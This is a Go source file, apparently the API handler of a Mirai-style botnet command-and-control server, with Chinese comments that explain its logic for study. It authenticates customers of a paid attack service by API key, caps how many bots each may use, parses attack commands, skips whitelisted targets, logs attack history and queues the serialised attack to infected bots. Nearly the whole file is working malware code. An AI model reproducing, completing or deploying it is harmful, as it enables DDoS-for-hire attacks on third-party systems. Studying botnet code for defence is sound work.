package main

import (
	"net"
	"strconv"
	"strings"
	"time"
)

//向感染的bot节点发送命令

type Api struct {
	conn net.Conn
}

func NewApi(conn net.Conn) *Api {
	return &Api{conn}
}

func (this *Api) Handle() {
	var botCount int
	var apiKeyValid bool
	var userInfo AccountInfo

	// Get command
	//这里需要注意setDeadline和timesout的区别
	//前者是一个固定时间点，后者是一个可以不断复用的时间
	//简单来说对一个连接而言，设置Deadline之后，除非你重新调用SetDeadline，否则这个Deadline不会变化。
	//一次到时后，时间会永远继续往下走，如果不重新设置，这个ddl不会二次触发了。
	//前面也提了，Deadline是一个绝对的时间点。因此，如果要通过SetDeadline来设置timeout，就不得不在每次执行Read/Write前重新调用它。
	//你可能并不想直接调用SetDeadline方法，而是选择 net/http提供的更上层的方法。
	//不过上层的timeout方法都是基于Deadline来实现的。
	//ref：https://segmentfault.com/a/1190000016827032
	//      https://stackoverflow.com/questions/49358216/setdeadline-for-golang-tcp-connection
	this.conn.SetDeadline(time.Now().Add(60 * time.Second)) //设置当前时间+60s作为ddl
	cmd, err := this.ReadLine()
	if err != nil {
		this.conn.Write([]byte("ERR|Failed reading line\r\n"))
		return
	}
	passwordSplit := strings.SplitN(cmd, "|", 2) //以|对读取的数据进行分割
	//check购买用户的password以及是否在数据库中有记录，是否api对其可用
	if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
		this.conn.Write([]byte("ERR|API code invalid\r\n"))
		return
	}
	botCount = userInfo.maxBots //限制用户可用的最大bot数量
	cmd = passwordSplit[1]
	if cmd[0] == '-' { //解析用户当前申请的bot数量
		countSplit := strings.SplitN(cmd, " ", 2)
		count := countSplit[0][1:]
		botCount, err = strconv.Atoi(count)
		if err != nil {
			this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
			return
		}
		if userInfo.maxBots != -1 && botCount > userInfo.maxBots { //当前请求的bot数目不能超过上限
			this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
			return
		}
		cmd = countSplit[1]
	}

	atk, err := NewAttack(cmd, userInfo.admin) //解析用户发起的攻击命令，记录到atk中
	if err != nil {
		this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
		return
	}
	buf, err := atk.Build() //序列化攻击参数，便于网络发送
	if err != nil {
		this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
		return
	}
	if database.ContainsWhitelistedTargets(atk) { //如果targets中包含一个白名单用户，那么所有target都失效，不会触发攻击（只要有一个）
		this.conn.Write([]byte("ERR|Attack targetting whitelisted target\r\n")) //猜测白名单中可能会包含本地ip，比如127.0.0.1【这应该是基本的配置】
		return
	}
	//进一步判断此时用户是否和之前的攻击有重叠，是否允许重叠（这里允许），以及持续时间不能超过上限，并且最终在history表中记录本次攻击的信息【这里最后一个参数为1，则表示允许重叠时间下发起多次攻击】
	if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
		this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
		return
	}
	//发送攻击命令的序列化表示buf，以及攻击要求的bot数量
	clientList.QueueBuf(buf, botCount, "") //clientList在main.go启动的时候就已经创建了，一直处于工作状态（相应的channel在等待）
	this.conn.Write([]byte("OK\r\n"))
}

//读取一行数据
func (this *Api) ReadLine() (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for { //循环读取。
		//一次只读取一个字节
		n, err := this.conn.Read(buf[bufPos : bufPos+1]) //读取【不管是连接缓冲区还是buf变量本身的空闲空间为空的时候，都会停止读取】，但是如果是传输过来的连接缓冲区先读取到空，则会返回err=io.EOF
		if err != nil || n != 1 {
			return "", err //如果有误，就直接返回空字符和，err
		}
		//读取到EOF
		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			return string(buf[:bufPos]), nil //如果读取到\n或者\x00，就返回。
		}
		bufPos++
	}
	return string(buf), nil
}
